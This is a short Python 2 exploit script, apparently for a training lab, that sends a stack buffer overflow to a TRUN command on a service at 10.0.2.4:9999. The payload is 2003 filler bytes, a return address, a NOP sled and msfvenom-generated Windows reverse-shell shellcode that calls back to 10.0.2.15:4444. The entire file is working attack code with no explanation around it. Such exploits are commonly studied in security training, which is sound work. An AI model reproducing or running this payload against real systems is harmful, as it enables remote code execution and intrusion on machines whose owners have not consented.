#!/usr/bin/python
import sys,socket

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" <to exclude bad character>
overflow = ("\xb8\x22\xf6\xe7\x30\xdd\xc1\xd9\x74\x24\xf4\x5b\x31\xc9"
"\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\x61\xf8\x05\xc5\x99"
"\xec\x48\x26\x61\xed\x2c\xae\x84\xdc\x6c\xd4\xcd\x4f\x5d"
"\x9e\x83\x63\x16\xf2\x37\xf7\x5a\xdb\x38\xb0\xd1\x3d\x77"
"\x41\x49\x7d\x16\xc1\x90\x52\xf8\xf8\x5a\xa7\xf9\x3d\x86"
"\x4a\xab\x96\xcc\xf9\x5b\x92\x99\xc1\xd0\xe8\x0c\x42\x05"
"\xb8\x2f\x63\x98\xb2\x69\xa3\x1b\x16\x02\xea\x03\x7b\x2f"
"\xa4\xb8\x4f\xdb\x37\x68\x9e\x24\x9b\x55\x2e\xd7\xe5\x92"
"\x89\x08\x90\xea\xe9\xb5\xa3\x29\x93\x61\x21\xa9\x33\xe1"
"\x91\x15\xc5\x26\x47\xde\xc9\x83\x03\xb8\xcd\x12\xc7\xb3"
"\xea\x9f\xe6\x13\x7b\xdb\xcc\xb7\x27\xbf\x6d\xee\x8d\x6e"
"\x91\xf0\x6d\xce\x37\x7b\x83\x1b\x4a\x26\xcc\xe8\x67\xd8"
"\x0c\x67\xff\xab\x3e\x28\xab\x23\x73\xa1\x75\xb4\x74\x98"
"\xc2\x2a\x8b\x23\x33\x63\x48\x77\x63\x1b\x79\xf8\xe8\xdb"
"\x86\x2d\xbe\x8b\x28\x9e\x7f\x7b\x89\x4e\xe8\x91\x06\xb0"
"\x08\x9a\xcc\xd9\xa3\x61\x87\xef\x33\x6b\x58\x98\x31\x6b"
"\x77\x04\xbf\x8d\x1d\xa4\xe9\x06\x8a\x5d\xb0\xdc\x2b\xa1"
"\x6e\x99\x6c\x29\x9d\x5e\x22\xda\xe8\x4c\xd3\x2a\xa7\x2e"
"\x72\x34\x1d\x46\x18\xa7\xfa\x96\x57\xd4\x54\xc1\x30\x2a"
"\xad\x87\xac\x15\x07\xb5\x2c\xc3\x60\x7d\xeb\x30\x6e\x7c"
"\x7e\x0c\x54\x6e\x46\x8d\xd0\xda\x16\xd8\x8e\xb4\xd0\xb2"
"\x60\x6e\x8b\x69\x2b\xe6\x4a\x42\xec\x70\x53\x8f\x9a\x9c"
"\xe2\x66\xdb\xa3\xcb\xee\xeb\xdc\x31\x8f\x14\x37\xf2\xaf"
"\xf6\x9d\x0f\x58\xaf\x74\xb2\x05\x50\xa3\xf1\x33\xd3\x41"
"\x8a\xc7\xcb\x20\x8f\x8c\x4b\xd9\xfd\x9d\x39\xdd\x52\x9d"
"\x6b")

shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" *32 +overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.0.2.4',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print "Error connecting to server"
    sys.exit()